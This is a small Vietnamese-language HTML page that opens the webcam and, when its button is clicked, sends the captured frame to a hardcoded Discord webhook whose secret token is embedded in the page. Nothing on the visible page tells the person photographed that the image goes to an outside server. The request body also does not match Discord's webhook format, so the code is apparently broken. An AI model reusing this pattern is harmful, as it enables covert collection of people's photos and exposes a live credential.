<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chụp Ảnh và Gửi qua Webhook</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        video {
            width: 320px;
            height: 240px;
            border: 2px solid #666;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Chụp Ảnh</h1>
    <video id="video" autoplay></video>
    <button id="capture">Chụp Ảnh</button>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureButton = document.getElementById('capture');

        // Khởi động camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("Lỗi truy cập camera: ", err);
            });

        // Chụp ảnh
        captureButton.addEventListener('click', () => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            // Chuyển đổi ảnh thành data URL
            const imageData = canvas.toDataURL('image/png');

            // Gửi ảnh qua webhook
            sendImageToWebhook(imageData);
        });

        // Hàm gửi ảnh qua webhook
        function sendImageToWebhook(imageData) {
            fetch('https://discord.com/api/webhooks/1295745366435561503/Zo_XHN4YlWh3T_eTzGXS94Z06Kse57GXw36d3qpiuvgITnml65RZrYlg6OO-q01348Ao', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ image: imageData }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Thành công:', data);
            })
            .catch((error) => {
                console.error('Lỗi:', error);
            });
        }
    </script>
</body>
</html>
